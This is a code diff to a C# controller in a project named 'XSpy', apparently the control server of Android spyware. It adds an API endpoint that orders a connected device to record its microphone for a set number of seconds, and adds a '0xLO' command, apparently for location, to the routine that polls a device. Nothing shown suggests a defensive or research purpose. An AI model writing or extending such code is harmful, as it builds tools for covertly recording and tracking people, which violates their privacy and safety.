@@ -91,6 +91,30 @@ namespace XSpy.Controllers.Api
             return Ok(pathRequest);
         }
         
+        [HttpPost("{deviceId}/rec"), PreExecution]
+        public async Task<IActionResult> Record([FromRoute] Guid deviceId, MicRecordRequest recordRequest)
+        {
+            var device = await _deviceService.GetDeviceById(deviceId);
+            if (device == null || string.IsNullOrEmpty(device.DeviceId))
+                return NotFound();
+
+            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
+            if (string.IsNullOrEmpty(connId))
+                return BadRequest();
+
+            var client = _hubContext.Clients.Client(connId);
+            if (client == null)
+                return BadRequest();
+
+            await client.SendAsync("0xMI", recordRequest.Seconds);
+
+            device.RecordingMicBlock = DateTime.Now.AddSeconds(recordRequest.Seconds);
+            _deviceService.Save(device);
+            await _deviceService.Commit();
+
+            return Ok(recordRequest);
+        }
+        
 
         [HttpGet("{deviceId}/update"), PreExecution]
         public async Task<IActionResult> RequestUpdate(Guid deviceId)
@@ -121,8 +145,9 @@ namespace XSpy.Controllers.Api
             await client.SendAsync("0xPM");
             await client.SendAsync("0xIN");
             await client.SendAsync("0xGI");
+            await client.SendAsync("0xLO");
 
-            return Ok();
+            return Ok(deviceId);
         }
 
         [Route("list"), PreExecution]
